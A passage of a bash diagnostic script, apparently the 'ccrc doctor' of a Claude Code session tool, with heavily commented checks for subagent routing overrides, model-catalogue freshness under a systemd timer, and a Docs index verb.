      # systemd-shaped census, full stop — checked here, before
      # `_have_systemctl` is asked anything.
      census=unmeasured
      why="this is a launchd box (CCD_OS=darwin) and the live-session census needs systemctl --user, which launchd boxes don't run"
    elif ! _have_systemctl; then
      census=unmeasured
      why="systemctl is not on PATH, so no unit could be asked whether it is live"
    else
      for sf in "$reg"/*.uuid; do
        [ -e "$sf" ] || continue
        id="${sf##*/}"; id="${id%.uuid}"
        systemctl --user is-active "claude-session@$id.service" >/dev/null 2>&1; scrc=$?
        if [ "$scrc" -eq 0 ]; then
          live=$((live + 1))
          if [ ! -e "$reg/$id.class" ]; then
            missing=$((missing + 1))
            if [ "$shown" -lt 5 ]; then
              missing_ids="${missing_ids:+$missing_ids }$id"; shown=$((shown + 1))
            fi
          fi
        elif [ "$scrc" -eq 3 ]; then
          continue   # measured: not live (systemd's own inactive/failed)
        else
          census=unmeasured
          why="systemctl --user is-active answered neither active nor inactive for claude-session@$id.service (exit $scrc)"
          break
        fi
      done
    fi
    if [ "$census" = unmeasured ]; then
      _dr_warn routing "$_sub_lead — whether every live session already carries one is unmeasured: $why" "$_sub_remedy"
      rc=2
    elif [ "$missing" -eq 0 ] && [ "$live" -ge 1 ]; then
      # RULING S5-R12(1): live >= 1 AND missing == 0 — a real, fully-recorded
      # population. This is the ONLY FAIL left in this arm; dropping either
      # half of the guard turns a zero-live or a not-yet-measured box into a
      # fabricated FAIL.
      _dr_fail routing "an Anthropic lane's settings.json pins CLAUDE_CODE_SUBAGENT_MODEL ($sub) while every live session carries a routing record (a \`.class\` field, \`default\` included) — the key overrides the record's subagent field; remove it" \
        "remove CLAUDE_CODE_SUBAGENT_MODEL from $sub' settings.json — every live session already carries a routing record (a \`.class\` field, \`default\` included); ccrc update stops at this verdict until the key is gone"
      return 1
    elif [ "$live" -eq 0 ]; then
      # RULING S5-R12(2): live == 0, measured — its own WARN, worded so it
      # reads as neither "unmeasured" nor "missing > 0".
      _dr_warn routing "$_sub_lead — no live session to measure the key against; it will override the first spawn's record until removed" "$_sub_remedy"
      rc=2
    else
      local _sub_trunc=""
      [ "$missing" -gt "$shown" ] && _sub_trunc=" and $((missing - shown)) more"
      _dr_warn routing "$_sub_lead — $missing live session(s) carry no routing record (a \`.class\` field, \`default\` included) yet: $missing_ids$_sub_trunc" "$_sub_remedy"
      rc=2
    fi
  fi
  if [ -n "$unread" ]; then
    _dr_warn routing "could not read settings.json for: $unread" "chmod u+r <home>/settings.json, or check by hand for CLAUDE_CODE_SUBAGENT_MODEL and CLAUDE_CODE_EFFORT_LEVEL"
    rc=2
  fi
  [ "$rc" -eq 0 ] || return "$rc"
  _dr_pass routing "$n Anthropic lane(s): no settings.json overrides the routing record's spawn env"
}

# ── models: is each lane's model catalogue actually being refreshed? ──────
# THE TWO FILES PER LANE, NOT ONE (census/C-contract.md §0, the premise this
# check exists to get right): `<id>.classes.json` is the REGISTRY — operator-
# owned, written by `ccrc models <id> init/set-*`, and it never carries
# `fetchedAt`/`stale`/`lastError` at all. `<id>.json` is the CATALOGUE —
# generated by `ccd/ccrc-models-probe`, and it is the ONLY place those three
# fields live. The POPULATION this check measures is `[ -f
# "$dir/$id.classes.json" ]` — bare file presence, not `hasRegistry` itself
# (`deploy/models-op.mjs`'s `lanes` op) called directly. The two answer the same thing
# for an ordinary registry (ENOENT is the only outcome `hasRegistry` treats as
# false, matching a bare `[ -f ]`), but they are NOT the same predicate and the
# loop below documents the two cases where they diverge (a directory at that
# path; a structurally-excluded lane's stray file) — read those, not this
# sentence, for the exact shape of the gap. The FRESHNESS DATA comes from each
# population member's catalogue.
#
# THE PREDICATE, verbatim from the contract: fresh := stale == false AND
# (now - fetchedAt) <= 3*3600. `fetchedAt` is UNIX SECONDS
# (`ccd/ccrc-models-probe`'s `_normalise`, `int(time.time())`) — never the millisecond
# stamps the server side uses elsewhere. Three hours because the timer
# (`deploy/systemd/ccrc-models.{timer,service}`) carries `OnUnitActiveSec=
# 60min`, `TimeoutStartSec=300` (5 min) AND `AccuracySec=5min` (systemd may
# delay a run up to 5 min on its own) — worst honest case per cycle is
# 60+5+5=70 min, so one missed run alone is ~140 min, still under the 180 min
# floor with real margin to spare, not the exact-fit the interval+timeout sum
# alone would suggest. The timer carries no `Persistent=true`, so a box
# returning from a downtime longer than 3h does not catch up on boot — it
# waits for `OnBootSec=3min` — and this check will WARN "the timer is not
# reaching this lane" for those few minutes, a cause claim that is false in
# that narrow window.
#
# `_mark_stale` (`ccd/ccrc-models-probe`) deliberately KEEPS the old
# `fetchedAt` when it sets `stale:true` on a failed probe (D-2224) — an
# mtime-based check would call a lane fresh for as long as the timer kept
# failing at it. So the two unhealthy arms below are NOT mutually exclusive
# in practice (a lane failing for hours is stale AND old), and `stale` is
# what decides which sentence fires:
#   - stale:false, fetchedAt older than 3h: nobody rewrote the file — the
#     timer itself is not reaching this lane, and that is the SILENT case
#     the `services` check's `known` unit list cannot see: an active
#     `ccrc-models.timer` that fires and writes nothing looks identical, to
#     a systemd active-state test, to one that never stopped.
#   - stale:true: the timer ran and the provider refused it. Warned
#     REGARDLESS of age — the env block built from this catalogue has
#     already lost its window key the moment the probe failed, not three
#     hours later.
# Both WARN, never FAIL: the lane keeps serving from its last-known-good
# catalogue either way, so nothing here is actually down.
#
# A registry with no catalogue at all is "never probed" (C2) — its own WARN,
# not a freshness failure. An ORPHAN registry (an id in no roster row) is
# Plan 2's item, not this one's: SKIP it, silently, exactly as `hasRegistry`'s
# own population never counts a lane the roster does not name.
#
# STRUCTURAL TEMPLATE: `_check_credentials` above — the closest of the checks
# that read the roster and loop per-id in bash (`_check_wrappers` and
# `_check_accounts` also do both, so "only other" is false; `_check_credentials`
# is still the right template because its roster-unreadable SKIP, its
# id-grammar filter and its zero-eligible-ids SKIP are the exact shape this
# check needs). Same three: a scan over an empty list passes everything, and
# an empty population must not read as a confident PASS naming no lane (C5).
_check_models() {
  local roster="$HOME/.ccrc/accounts.json"
  if [ ! -f "$roster" ] || [ ! -r "$roster" ]; then
    _dr_skip models "no readable account roster at \$HOME/.ccrc/accounts.json — the 'wrappers' check above owns that"
    return 3
  fi
  if ! command -v node >/dev/null 2>&1; then
    _dr_fail models "node is not on PATH, so \$HOME/.ccrc/accounts.json cannot be read" \
      "install Node first — see the 'node' check above"
    return 1
  fi
  local ids rc
  ids="$(CCRC_DOCTOR_ROSTER="$roster" node -e '
    const fs = require("fs");
    let j;
    try { j = JSON.parse(fs.readFileSync(process.env.CCRC_DOCTOR_ROSTER, "utf8")); }
    catch (e) { process.exit(3); }
    if (!j || typeof j !== "object" || !Array.isArray(j.accounts)) process.exit(4);
    // Every roster row, not filtered by telemetry: the REGISTRY FILE is what
    // defines this population — an Anthropic lane simply never has one.
    const ok = /^[a-z][a-z0-9-]{0,31}$/;
    process.stdout.write(j.accounts
      .filter((a) => a && typeof a === "object" && ok.test(a.id))
      .map((a) => a.id).join("\n"));
  ' 2>/dev/null)"; rc=$?
  if [ "$rc" -ne 0 ]; then
    _dr_skip models "\$HOME/.ccrc/accounts.json could not be read as a roster — the 'wrappers' check above owns that"
    return 3
  fi
  if [ -z "$ids" ]; then
    _dr_skip models "no account on this box declares an id, so there is no model registry to look for"
    return 3
  fi
  local dir="$HOME/.ccrc/models"
  local id
  local -a population=()
  for id in $ids; do
    # THE POPULATION FILE. An id with no `<id>.classes.json` is a lane nobody
    # ran `ccrc models <id> init` on (or an Anthropic lane, which has none by
    # design) — not this check's business. An id in no roster row never
    # reaches this loop at all — that is C2's orphan, silently out of scope.
    #
    # This bare `[ -f ]` is NOT `hasRegistry` (`deploy/models-op.mjs`'s `lanes` op), and
    # it diverges from it in both directions, on purpose per the brief's own
    # C2 (file presence stays the population), but the divergence needs
    # naming rather than a false claim of parity:
    #   - a DIRECTORY at this path is `hasRegistry: true` (registryInvalid is
    #     non-null; ENOENT is the only outcome that yields false) but `[ -f ]`
    #     is false for it, so this check SKIPS a lane `refresh --all` would
    #     still attempt.
    #   - a lane `canCarryRegistry` structurally refuses — no `exec` object at
    #     all, `exec.kind === 'upstream'`, or `telemetry === 'anthropic'` (all
    #     three conjuncts of the shipped predicate, `deploy/models-op.mjs`'s `canCarryRegistry`)
    #     — never reaches `hasRegistry` at all, but a stray `<id>.classes.json`
    #     left on disk
    #     for one still satisfies `[ -f ]` here, entering the population and
    #     drawing a permanent WARN whose printed remedy (`ccrc models refresh
    #     <id>`) exits non-zero for that lane.
    [ -f "$dir/$id.classes.json" ] && population+=("$id")
  done
  if [ "${#population[@]}" -eq 0 ]; then
    # THE EMPTY-POPULATION WORD (C5): not a PASS naming no lane.
    _dr_skip models "no account on this box has a model registry (\$HOME/.ccrc/models/<id>.classes.json) — nothing to freshness-check"
    return 3
  fi
  local now_s
  if ! command -v date >/dev/null 2>&1 || ! now_s="$(date +%s 2>/dev/null)"; then
    _dr_warn models "${#population[@]} lane(s) have a model registry, but this box's \`date\` cannot answer +%s, so no catalogue's age can be measured" \
      "install a working GNU/BSD date — every other age-based check in this file needs it too"
    return 2
  fi
  # ONE node CALL FOR EVERY POPULATION MEMBER, not one per id — the roster can
  # carry dozens of lanes and each id would otherwise be its own subprocess.
  # Reads only `<id>.json` (the CATALOGUE); the registry above was
  # presence-only.
  #
  # C2 fix round 1 — a failed read of ANY ONE lane's catalogue used to be
  # indistinguishable from an empty population, and both rendered as a
  # confident `PASS models: 0 lanes,` for the WHOLE box (measured: a
  # non-object catalogue on one lane swallowed a genuinely stale lane's WARN
  # too). Two independent causes, both fixed here:
  #   (a) a catalogue that parses as JSON but is not an object (`null`, an
  #       array, a bare number) used to fall through to reading `.fetchedAt`
  #       off it directly, which throws for `null` and kills this whole
  #       batched `node -e` before it emits a line for ANY id, not just the
  #       bad one. Guarded below with its own object check, same INVALID verdict
  #       a parse failure gets.
  #   (b) the capture had no exit-status check, unlike the roster read above
  #       — any other non-zero exit (a crash this guard did not anticipate,
  #       node itself missing mid-run, etc.) silently yielded an empty `$out`,
  #       an empty loop, and the same false PASS. `rc2` below gives a failed
  #       read of the WHOLE batch its own WARN, never a silent empty loop.
  #
  # THE FIELD DELIMITER IS 0x1F (ASCII unit separator), NOT A TAB — measured
  # while wiring in the UNREADABLE/INVALID rows above: `IFS=$'\t' read` in
  # bash collapses a RUN of consecutive tabs into a single field separator
  # (tab is classified as "IFS whitespace" no matter what IFS itself is set
  # to), so a row with two or three adjacent EMPTY fields — exactly what
  # NOCATALOGUE/INVALID/UNREADABLE all emit, and what OK emits whenever
  # `fetchedAt` is absent — silently loses fields and shifts every later
  # column left. Measured: `id\tOK\t\t0\t` (empty fetchedAt, stale "0") read
  # back as fa="0" stale="" instead of fa="" stale="0". 0x1F is never
  # "whitespace" to `read`, so an empty field between two of it is preserved
  # exactly, which is the one property this five-column protocol needs.
  local -r US=$'\x1f'
  local out rc2
  out="$(CCRC_DOCTOR_MODELS_DIR="$dir" node -e '
    const fs = require("fs");
    const path = require("path");
    const dir = process.env.CCRC_DOCTOR_MODELS_DIR;
    const US = "\x1f";
    const ids = fs.readFileSync(0, "utf8").split("\n").filter(Boolean);
    for (const id of ids) {
      const p = path.join(dir, id + ".json");
      let raw;
      // F2 (review run 69) -- D-2380s own class, reintroduced in this checks
      // new code. readFileSync opens BY NAME with no regard for TYPE: a FIFO
      // with no writer, a symlink to one, or an unbounded character device at
      // <id>.json blocks INSIDE the read, so the catch below never runs and
      // ONE poisoned catalogue hangs the whole operator-facing ccrc doctor --
      // cmd_doctors driver wraps no deadline. Measured: mkfifo gpt.json then
      // this read gave rc 124 under a bounded 5s deadline, with the catch
      // never entered.
      // The C3 reasoning under that catch cannot reach it: a FIFO is not an
      // errno, it is a block. And the population gate 57 lines above does not
      // cover it -- that -f test is on the per-lane REGISTRY file, while this
      // read is of the CATALOGUE, a different path. So apply that gates
      // own TYPE TEST here, spelled the way node spells the bash -f operator:
      // statSync FOLLOWS symlinks and isFile() is true only for a regular
      // file, so a symlink to a real catalogue still reads exactly as before.
      // lstatSync runs FIRST so an ABSENT path is told apart from a DANGLING
      // symlink, and only the genuinely absent one reads as "never probed" --
      // C3s own distinction, applied to the shapes C3 could not see.
      //
      // NOTE FOR EDITORS: this program is a single-quoted bash string. An
      // apostrophe anywhere in it closes that string; that is why the prose
      // above has none.
      try { fs.lstatSync(p); }
      catch (e) {
        if (e && e.code === "ENOENT") { process.stdout.write(id + US + "NOCATALOGUE" + US + US + US + "\n"); }
        else { process.stdout.write(id + US + "UNREADABLE" + US + US + US + ((e && e.code) || "unknown") + "\n"); }
        continue;
      }
      let st;
      try { st = fs.statSync(p); }
      catch (e) {
        // PRESENT to lstat but not to stat: a DANGLING symlink, which answers
        // ENOENT here and must never read as "never probed", or a symlink
        // loop, which answers ELOOP.
        process.stdout.write(id + US + "UNREADABLE" + US + US + US + ((e && e.code) || "unknown") + "\n");
        continue;
      }
      if (!st.isFile()) {
        process.stdout.write(id + US + "UNREADABLE" + US + US + US + "not-a-regular-file" + "\n");
        continue;
      }
      try { raw = fs.readFileSync(p, "utf8"); }
      catch (e) {
        // C3: ENOENT alone means "never probed" — every other errno (a
        // directory at that path, EACCES, ...) is a refusal the file system
        // can see, and folding it into NOCATALOGUE would tell an operator
        // "never probed" about a lane whose probe cannot even run.
        if (e && e.code === "ENOENT") { process.stdout.write(id + US + "NOCATALOGUE" + US + US + US + "\n"); }
        else { process.stdout.write(id + US + "UNREADABLE" + US + US + US + ((e && e.code) || "unknown") + "\n"); }
        continue;
      }
      let j;
      try { j = JSON.parse(raw); }
      catch (e) { process.stdout.write(id + US + "INVALID" + US + US + US + "\n"); continue; }
      // (a) above: valid JSON that is not an object (null, an array, a bare
      // number/string) has no `.fetchedAt` to read — reading it off `null`
      // throws and would otherwise kill every remaining id in this batch.
      if (j === null || typeof j !== "object" || Array.isArray(j)) {
        process.stdout.write(id + US + "INVALID" + US + US + US + "\n"); continue;
      }
      // C4: only an actual finite integer is safe for bash `$(( ))`
      // arithmetic below — `typeof x === "number"` alone is also true of
      // NaN, and a float or scientific-notation string would break that
      // arithmetic too. Anything else is treated as absent; the bash side
      // re-validates the string shape it receives regardless (belt+braces
      // across the process boundary).
      const fetchedAt = (typeof j.fetchedAt === "number" && Number.isInteger(j.fetchedAt))
        ? String(j.fetchedAt) : "";
      const stale = j.stale === true ? "1" : "0";
      const lastError = typeof j.lastError === "string" ? j.lastError.replace(/[\t\n\x1f]/g, " ") : "";
      process.stdout.write(id + US + "OK" + US + fetchedAt + US + stale + US + lastError + "\n");
    }
  ' <<<"$(printf '%s\n' "${population[@]}")" 2>/dev/null)"; rc2=$?
  if [ "$rc2" -ne 0 ]; then
    # (b) above: a failed read is not a PASS and not a SKIP — the empty
    # population's SKIP a few lines up is about a POPULATION with nothing in
    # it; this is a POPULATION this run could not measure.
    # R3(a): the reader may have already printed a row or two before the
    # non-zero exit — this branch never looks at $out either way, so "before
    # reporting on any of them" would claim a fact this check did not check.
    # Say what actually happens: any partial output is discarded, not trusted.
    _dr_warn models "${#population[@]} lane(s) have a model registry, but the catalogue reader exited non-zero (rc=$rc2) — any rows it already printed are discarded rather than trusted, so this box's model freshness could not be measured this run" \
      "re-run ccrc doctor; this check runs node with stderr sent to /dev/null, so if it keeps failing, read the node process's own error by running its command directly against \$HOME/.ccrc/models without that redirect"
    return 2
  fi
  if [ -z "$out" ]; then
    # R1 (review run 69) — the coordinator RULED this closed against its own
    # panel, which refuted the finding 3/3 and was right about the shipped
    # reader. The ground for closing it is this function's own text, not the
    # reachability argument: the ROSTER read above is guarded on BOTH its exit
    # status (`[ "$rc" -ne 0 ]`) and its emptiness (`[ -z "$ids" ]`); the
    # CATALOGUE read had only the first. The `rc2` comment says that check
    # exists because an empty `$out` gave "an empty loop, and the same false
    # PASS" — and a ZERO-exit empty batch produces exactly that, so the guard
    # did not cover the case its own comment names. A guard whose comment
    # names a case it does not reach is a false guard, which is the class this
    # whole wave is about.
    #
    # Reachability, measured and stated honestly: through the SHIPPED reader
    # this is unreachable — a non-empty population always emits one row per
    # id. It is reachable through any other `node` on PATH, which is how the
    # suite reaches it (`stubNodeModelsExit <home> 0`).
    _dr_warn models "${#population[@]} lane(s) have a model registry, but the catalogue reader exited zero and printed no rows at all — this box's model freshness could not be measured this run, and a PASS naming no lane would be a confident answer over a population nothing measured" \
      "re-run ccrc doctor; if it persists, check which node is on PATH — this check runs node with stderr sent to /dev/null, so run its command directly against \$HOME/.ccrc/models without that redirect to see what the interpreter actually prints"
    return 2
  fi

  local -a ok=() warn=()
  local lid status fa stale lastError age age_min
  while IFS="$US" read -r lid status fa stale lastError; do
    [ -n "$lid" ] || continue
    case "$status" in
      NOCATALOGUE)
        # C2 (population): never probed is its own WARN, not a freshness failure.
        warn+=("$lid has no model catalogue yet (\$HOME/.ccrc/models/$lid.json does not exist) — the timer has never probed this lane; run: ccrc models refresh $lid")
        ;;
      UNREADABLE)
        # C3: the file EXISTS and is not a catalogue this check could read —
        # a refusal, never "never probed" (D-114's exact lesson: the two are
        # different states and folding them hides a broken probe behind what
        # reads as an empty screen).
        warn+=("$lid's catalogue at \$HOME/.ccrc/models/$lid.json exists but could not be read ($lastError) — this is a broken path, not an unprobed lane; check its type/permissions, then: ccrc models refresh $lid")
        ;;
      INVALID)
        warn+=("$lid's catalogue at \$HOME/.ccrc/models/$lid.json is not valid JSON; run: ccrc models refresh $lid")
        ;;
      OK)
        # C4: validate the shape before the arithmetic below, not after — an
        # empty OR non-integer `fa` (the node side already screens most of
        # this, but the string crosses a process boundary and is re-checked
        # here rather than trusted) gets its own verdict instead of an
        # `$(( ))` that kills the whole check with no verdict line at all.
        if [ -z "$fa" ] || ! [[ "$fa" =~ ^-?[0-9]+$ ]]; then
          # R6: this arm also catches values that ARE numeric but not a
          # usable whole-second timestamp (a float like 1789000000.5, or a
          # value so large it is a millisecond/far-future stamp in disguise
          # like 1e21) — "has no numeric fetchedAt" is false for those; say
          # what is actually wrong.
          warn+=("$lid's catalogue fetchedAt is not a usable whole-second timestamp, so its age cannot be measured; run: ccrc models refresh $lid")
          continue
        fi
        age=$(( now_s - fa )); age_min=$(( age / 60 ))
        if [ "$stale" = 1 ]; then
          # ARM 2 (C4): the timer ran, the provider refused it. Warned
          # REGARDLESS of age — quote lastError and the age.
          warn+=("$lid's catalogue is stale ($age_min min old): ${lastError:-no lastError recorded} — check the $lid lane's credential/config, then: ccrc models refresh $lid")
        elif [ "$age" -lt 0 ]; then
          # C5: a future or millisecond-valued `fetchedAt` has no lower bound
          # otherwise, so it would PASS forever — unmeasurable is not fresh,
          # for the same reason the empty population gets its own SKIP rather
          # than a confident answer over nothing.
          warn+=("$lid's catalogue claims a fetchedAt $((-age)) s in the future — its age is unmeasurable, not fresh; run: ccrc models refresh $lid")
        elif [ "$age" -gt 10800 ]; then
          # ARM 1 (C4): stale:false but old — the silent case `services`'
          # `known` unit list cannot see (see this function's header comment).
          # C6: the `services` check measures ACTIVATION, not production — it
          # is exactly what catches a STOPPED timer, and exactly what CANNOT
          # catch one that is still active but has quietly stopped writing.
          warn+=("$lid's catalogue is $age_min min old and not marked stale — the ccrc-models timer is not reaching this lane (an active timer that has quietly stopped writing is invisible to the 'services' check above, which measures whether the unit is active, not whether it is producing anything — that check catches a STOPPED timer, not this one); run: systemctl --user status ccrc-models.timer, then: ccrc models refresh $lid")
        else
          ok+=("$lid catalogue $age_min min old")
        fi
        ;;
      *)
        # R3(b): the reader only ever emits NOCATALOGUE/UNREADABLE/INVALID/OK
        # today, but a `case` with no default arm silently DROPS a row whose
        # status it does not know — and if every row drops, `warn` and `ok`
        # both stay empty and this check falls through to the PASS branch
        # below naming zero lanes over a population that is not empty, the
        # exact string C2 exists to forbid. Give an unrecognized status its
        # own verdict rather than silence.
        warn+=("$lid's catalogue reported a status this check does not recognize (\"$status\") — treated as unmeasurable, not fresh; run: ccrc models refresh $lid")
        ;;
    esac
  done <<<"$out"

  if [ "${#warn[@]}" -gt 0 ]; then
    _dr_warn models "$(_dr_join "${warn[@]}")" \
      "systemctl --user status ccrc-models.timer ; ccrc models refresh <id> for one named lane"
    return 2
  fi
  # THE PASS NAMES EVERY LANE AND ITS AGE (C5): the population is what this
  # PASS is really asserting, so a box that answers PASS here cannot be a box
  # whose loop ran over nothing.
  local n="${#ok[@]}" plural=lane
  [ "$n" -eq 1 ] || plural=lanes
  _dr_pass models "$n $plural, $(_dr_join "${ok[@]}")"
}

# ── docs: does this box's ccd answer Docs (spec 2026-10-01 §7.2) ──────────
# The FLEET half of Docs, measured through the verb itself. Every Docs page
# is read by the agent exec-ing `$HOME/.local/bin/ccd docs-*` (spec §7.1), so
# this check runs the one verb of the four that is read-only by construction
# — `docs-index --all` writes nothing, never fetches and enumerates no
# worktree (§2 (h)) — under a deadline, and classifies its one-line answer.
# It is the first check in this file that runs a ccd verb against the live
# box, and it runs in every doctor, including the tail of an install or an
# update. What a FAIL here costs depends on the path, because only one of them
# lets doctor gate anything:
#   (1) A plain `ccrc install`: `_inst_doctor_tail` in ccd/ccrc is its own
#       gate (the update lock is free), so a FAIL keeps `~/ccrc.migrating`,
#       skips `_ver_gc`, and the install exits 1.
#   (2) `ccrc update`, and `ccrc rollback`'s kept spine: the staged spine's
#       doctor tail finds the updater's lock held and gates nothing. The
#       verb's health gate decides the migration finish and the version GC,
#       so a docs FAIL strands neither; it turns the verb's exit into 3
#       (D-3114), with the box on the new build and Docs unable to run on it.
# Either way the FAIL is honest and meant to be seen, not swallowed. A WARN
# never gates (`cmd_doctor` returns 1 only when a check FAILed).
#
# THE PYTHON FLOOR LIVES IN ccd, NOT HERE (C2). `_check_python3` stays a
# presence check; the 3.8 floor is ccd's docs bash front, which answers
# `helper-unavailable` with the detail `python-missing` or `python-too-old`,
# so this check reads the floor through the verb rather than restating it.
# It measures the python3 ccd finds under THIS shell's PATH; the agent's unit
# may carry another PATH, which no doctor check can see.
#
# COUNTS ONLY, NEVER A PROJECT NAME: doctor output gets pasted. No arm below
# prints a field of the answer except the failure WORD (held to a word
# grammar by the jq program) and the two fixed `helper-unavailable` details;
# a row's name and a `detail` string never reach a verdict line. The WARN's
# remedy is the one-liner that lists the unreadable rows on the operator's
# own terminal.
#
# STDOUT AND STDERR ARE CAPTURED APART, never `2>&1`: the answer is one JSON
# line by contract (§2 (b)), and one merged warning would turn a working box
# into an unparseable answer. NO TEMP FILE holds the stderr either: `mktemp`
# and `rm` are coreutils, and this file does not let a check's own diagnosis
# depend on a binary the broken box may lack (`_check_node`'s rule; the
# doctor suite's PATH carries neither). The inner shell serialises the three
# values with `declare -p` and `eval` reads them back here — bash's own
# quoting, so no byte ccd prints can escape it — and `3>&-` keeps ccd from
# inheriting the descriptor that carries them.
#
# `unwalked` (docs-index's count of projects its walk did not reach before its
# helper deadline, absent when 0) is a WARN, never a FAIL: the rows listed are
# intact and the box answers Docs. The line gains ", N not checked (time
# budget)"; a count, never a name.
#
# "SERVED BY DOCS" is a row whose `state` is `ready`: a repository with a
# default branch, the one state whose tree the Docs screen opens. The other
# six states are listed and serve no page.
_check_docs() {
  # A server-role box runs no ccd verb for Docs: the fleet box's doctor
  # measures the verb where the agent execs it. The role read is
  # `_check_memory`'s idiom — `-f` before `-r`, and `${BOX_ENV_FILE:-}`
  # because this file is sourced under `set -u` by callers that are not ccrc.
  local _srv_role=""
  [ -f "${BOX_ENV_FILE:-}" ] && [ -r "${BOX_ENV_FILE:-}" ] && _srv_role="$(_box_env_value "$BOX_ENV_FILE" CCRC_ROLE)"
  if [ "$_srv_role" = server ]; then
    _dr_skip docs "no ccd answers Docs here; the fleet box's doctor measures it"
    return 3
  fi
  # The path the agent execs (spec §7.1), never `command -v ccd`, which can
  # find a checkout's copy the agent never runs.
  local ccd="$HOME/.local/bin/ccd"
  if [ ! -e "$ccd" ] && [ ! -L "$ccd" ]; then
    _dr_fail docs "no ccd at \$HOME/.local/bin/ccd, the file the agent runs for every Docs read" \
      "ccrc update"
    return 1
  fi
  if [ ! -f "$ccd" ] || [ ! -x "$ccd" ]; then
    _dr_fail docs "\$HOME/.local/bin/ccd is not an executable file, so the agent cannot run it for a Docs read" \
      "ccrc update"
    return 1
  fi

  local out="" err="" rc=0 cap
  cap="$(
    {
      err="$(
        { out="$(_plat_timeout "$CCRC_DOCTOR_DOCS_TIMEOUT" "$ccd" docs-index --all </dev/null 3>&-)"; rc=$?; } 2>&1
        declare -p out rc >&3
      )"
      declare -p err
    } 3>&1
  )"
  eval "$cap"

  if [ "$rc" -eq 124 ]; then
    _dr_fail docs "ccd docs-index did not answer within $CCRC_DOCTOR_DOCS_TIMEOUT s" \
      "run \$HOME/.local/bin/ccd docs-index --all by hand to see whether it returns at all, then re-run: ccrc doctor"
    return 1
  fi
  if [ "$rc" -ne 0 ]; then
    # An old ccd's unknown-verb arm answers exactly rc 1 with `usage: ccd
    # {...}` on stderr (spec §7.2), which is the line this quotes: the first
    # one, cut to 200 BYTES — `LC_ALL=C` inside the substitution only, so the
    # cut counts bytes and the rest of the check keeps the box's locale.
    local first
    first="$(_dr_first_line "$err")"
    first="$(LC_ALL=C; printf '%s' "${first:0:200}")"
    _dr_fail docs "ccd could not run docs-index (rc $rc: ${first:-nothing on stderr}); it predates Docs or died" \
      "ccrc update"
    return 1
  fi
  if ! command -v jq >/dev/null 2>&1; then
    _dr_fail docs "jq is not on PATH, so ccd's docs-index answer cannot be read" \
      "install jq first — see the 'jq' check above"
    return 1
  fi

  # ONE jq program is both the shape gate and the reader, so no state exists
  # in which the shape was accepted and the fields could not be read. `-s`
  # slurps every JSON value stdout carries, so two answers are refused as
  # surely as none, and `type == "object"` comes first so a bare number reads
  # false rather than raising. The answer must be exactly one object with v 1
  # and verb docs-index, and either ok:true with a projects array or ok:false
  # with a word-shaped failure; anything else prints nothing and lands on the
  # last arm. The program is one single-quoted string: no apostrophe in it.
  local row tag a b c d
  row="$(jq -r -s '
    if length == 1 and (.[0] | type == "object" and .v == 1 and .verb == "docs-index") then .[0] else empty end
    | if .ok == true and (.projects | type) == "array" then
        "ok \(.projects | length) \([.projects[] | select(type == "object" and .state == "ready")] | length) \([.projects[] | select(type == "object" and .state == "repo-unreadable")] | length) \(if (.unwalked | type) == "number" and .unwalked > 0 then .unwalked | floor else 0 end)"
      elif .ok == false and (.failure | type) == "string" and (.failure | test("^[a-z][a-z0-9-]{0,63}$")) then
        "fail \(.failure) \(if .detail == "python-missing" or .detail == "python-too-old" then .detail else "-" end)"
      else empty end' <<<"$out" 2>/dev/null)"
  read -r tag a b c d <<<"$row"
  case "$tag" in
    ok)
      local line="$a projects under ccd's projects root, $b served by Docs"
      [ "$c" -gt 0 ] && line="$line, $c unreadable"
      [ "$d" -gt 0 ] && line="$line, $d not checked (time budget)"
      if [ "$c" -gt 0 ]; then
        _dr_warn docs "$line" \
          "ccd docs-index --all | jq -r '.projects[] | select(.state==\"repo-unreadable\") | .project'"
        return 2
      fi
      if [ "$d" -gt 0 ]; then
        _dr_warn docs "$line" \
          "the index walk stopped at its time budget; re-run when the box is quieter: ccrc doctor"
        return 2
      fi
      _dr_pass docs "$line"
      return 0
      ;;
    fail)
      if [ "$a" = helper-unavailable ]; then
        local why="its python3 probe failed"
        case "$b" in
          python-missing) why="ccd found no python3 it can run (python-missing)" ;;
          python-too-old) why="the python3 ccd runs is older than 3.8 (python-too-old)" ;;
        esac
        _dr_fail docs "ccd answers docs-index with helper-unavailable: $why — its Docs helper needs python3 3.8 or newer" \
          "install python3 3.8 or newer on the PATH ccd runs with (Debian/Ubuntu: sudo apt install python3; macOS: brew install python3), then re-run: ccrc doctor"
        return 1
      fi
      _dr_fail docs "ccd answers docs-index with $a — Docs cannot list this box's projects" \
        "run \$HOME/.local/bin/ccd docs-index --all by hand and read its detail field; if it names ccd itself: ccrc update"
      return 1
      ;;
    *)
      _dr_fail docs "ccd's docs-index answer is not one docs-v1 JSON object (v 1, verb docs-index, ok:true with a projects list or ok:false with a failure word)" \
        "run \$HOME/.local/bin/ccd docs-index --all by hand and read what it prints; ccrc update brings ccd and this doctor to one build"
      return 1
      ;;
  esac
}

# ── `_check_codex`'s usage rows (Plan 3a Task 6; spec §12; rulings R2, R6) ──
# THREE findings, each its own sentence with its own remedy. Each is RECORDED
# through `_check_codex`'s `_dr_cx_warn` (Task 4) and printed by its
# `_dr_cx_report`, never here. They are two of §12's three usage rows, plus
# the second writer R6 adds. §12's third, a probe model absent from the
# catalogue, is Task 4's `_dr_cx_lane` row, said once:
#   - ccrc's usage pair not installed, or a lane's instance not enabled: WARN,
#     remedy `ccrc install`, the converge that enables it
#     (D-3721: `cmd_doctor` runs a fixer on a
#     FAIL only, D-3113's one contract, and a stopped poller is a WARN);
#   - another repository's usage timer enabled for this lane: WARN, remedy the
#     operator's own disable — ccrc never disables another tool's unit, and the
#     converge withholds ccrc's own instance while it stands. The FLAT, id-less
#     one names no lane, so it is reported once, as unattributable;
#   - the lane's usage row stale, never published, or unreadable: WARN.
# "Enabled" is ccrc's own reading of the manager's links (`_codex_usage_enabled`
# in ccrc, D-3726), the one the
# converge acts on. No systemctl call: nothing here needs the user bus.
# NOT APPLICABLE ON macOS, and said so, never a WARN: ccrc places no launchd job
# for the poller (decision 17), so a WARN there would stand on every macOS codex
# lane for ever — the noise `_inst_linger_darwin`'s doctrine refuses
# (D-3720).
# The usage row is read only after a regular-file test (a FIFO at that path
# blocks a read — F2's class, `_check_models`), and nothing here opens an OAuth
# file.
# THREE of the timer's 15-minute cycles: one missed poll is not a finding.
# `ccrc-doctor.test.ts` ties this to the shipped timer's `OnUnitActiveSec=`.
_DR_CODEX_USAGE_STALE_S=2700

